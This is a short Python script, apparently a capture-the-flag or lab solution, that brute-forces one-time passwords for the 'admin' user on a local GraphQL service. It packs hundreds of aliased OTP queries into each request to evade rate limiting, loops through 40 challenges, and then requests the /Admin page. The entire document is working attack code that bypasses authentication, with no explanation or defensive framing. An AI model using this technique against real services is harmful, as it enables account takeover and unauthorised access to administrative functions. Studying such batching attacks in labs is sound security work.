import requests 
import string

NUM_CHALLENGE = 40 
STRENGTH_CHALLENGE = 999

url =  "http://localhost:7654"
s = requests.Session() 

alias = [ ]
for x1 in string.ascii_lowercase: 
    for x2 in string.ascii_lowercase:              
        alias.append(x1 + x2)

k = 0
offset = 250
for i in range(NUM_CHALLENGE): 
    for n in range(0, STRENGTH_CHALLENGE, offset): 
        
        qry = "query Qry($u:String!){"
        for j, otp in enumerate(range(n, min(n + offset, STRENGTH_CHALLENGE))):
            qry += f'{alias[j]}:otp(u:$u,i:{i},otp:"{otp:03d}")' 

        qry += "}"
        print(qry)

        r = s.post(
                f"{url}/graphql?query={qry}", 
                json={"variables": { "u": "admin" }}
            )
        
        if "OK !!!" in r.text: 
            print(r.text)
            break

r = s.get(f"{url}/Admin")   
print(r.text)